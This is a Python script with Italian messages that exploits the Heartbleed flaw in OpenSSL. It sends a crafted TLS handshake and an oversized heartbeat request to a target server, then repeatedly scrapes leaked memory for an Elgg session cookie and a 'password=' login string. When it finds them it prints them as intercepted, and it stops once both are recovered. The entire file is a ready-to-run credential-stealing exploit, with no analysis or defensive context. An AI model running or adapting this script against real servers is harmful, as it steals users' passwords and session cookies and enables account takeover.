#!/usr/bin/env python3

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]')
options.add_option('-p', '--port', type='int', default=443, help='Porta TCP')

def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))

# Versione TLS 1.2 (la più comune)
ver_hex = '03 03'

def create_hello():
    return h2bin('16 ' + ver_hex + ' 00 dc 01 00 00 d8 ' + ver_hex + ''' 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

def create_hb():
    return h2bin('18 ' + ver_hex + ' 00 03 01 40 00')

def main():
    opts, args = options.parse_args()
    if not args: return
    target = args[0]

    found_login = False
    found_cookie = False

    print(f"[*] In ascolto su {target}... (premere CTRL+C per fermare)")
    
    while not (found_login and found_cookie):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, opts.port))
            s.send(create_hello())
            
            while True:
                hdr = s.recv(5)
                if not hdr: break
                typ, ver, ln = struct.unpack('>BHH', hdr)
                pay = s.recv(ln)
                if typ == 22 and pay[0] == 0x0E: break
            
            s.send(create_hb())
            hdr = s.recv(5)
            if hdr and hdr[0] == 24:
                ln = struct.unpack('>H', hdr[3:])[0]
                pay = s.recv(ln)
                
                readable = re.findall(br"[\x20-\x7E]{4,}", pay)
                for b_string in readable:
                    s_str = b_string.decode('ascii', errors='ignore')
                    
                    if "elgg=" in s_str.lower() and not found_cookie:
                        print(f"\033[96m[COOKIE INTERCETTATO] --> {s_str}\033[0m")
                        found_cookie = True
                    
                    if "password=" in s_str.lower() and not found_login:
                        print(f"\033[92m[LOGIN INTERCETTATO ] --> {s_str}\033[0m")
                        found_login = True
            s.close()
        except: pass
        if not (found_login and found_cookie):
            sys.stdout.write(".")
            sys.stdout.flush()
            time.sleep(0.5)

    print("\n\033[93m[!] Successo: Tutti i dati sono stati recuperati.\033[0m")

if __name__ == '__main__':
    main()
